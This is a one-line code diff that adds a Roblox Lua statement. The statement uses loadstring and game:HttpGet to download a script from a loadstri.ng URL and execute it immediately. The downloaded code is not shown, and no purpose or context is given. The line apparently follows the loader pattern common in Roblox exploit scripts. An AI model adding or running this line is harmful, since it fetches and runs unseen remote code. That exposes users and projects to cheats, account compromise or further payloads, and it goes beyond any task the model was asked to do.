@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://loadstri.ng/l/7b406d6c-dad6-4965-9cbd-26d318ba6bcd"))()
